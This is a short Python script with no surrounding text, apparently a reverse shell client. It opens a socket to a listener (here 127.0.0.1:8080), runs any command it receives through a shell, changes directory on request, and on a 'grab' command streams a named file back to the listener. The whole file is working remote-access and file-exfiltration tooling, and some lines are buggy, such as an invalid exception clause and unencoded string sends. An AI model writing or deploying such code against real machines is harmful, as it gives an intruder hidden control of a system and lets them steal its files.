import socket
import os
import subprocess      #starts the shell

def transfer(s,path):
    if os.path.exists(path):
        f=open(path,'rb')
        packet=f.read(1024)
        while packet:
            s.sendall(packet)
            packet=f.read(1024)
        s.sendall(b'Done')       
        f.close()

    else:
        s.send('Unable to find the file')

def connect():
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(('127.0.0.1',8080))
    while True:
        command=s.recv(1024)
        command=command.decode('utf-8')
        print(command)
        if 'terminate' in command :
            s.close()
            break
        elif 'grab' in command:
            grab,path=command.split('*')
            try:
                transfer(s,path)
            except Exception(e):
                s.sendall(str(e))
                pass
        elif 'cd' in command:
            code, directory = command.split(' ')
            os.chdir(directory)
            a=('[+] CWD is : ' + os.getcwd())
            byt = a.encode('utf-8')
            s.sendall(byt)
        else:
            CMD=subprocess.Popen(command,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
            s.sendall(CMD.stdout.read())
            s.sendall(CMD.stderr.read())



def main():
    connect()
main()

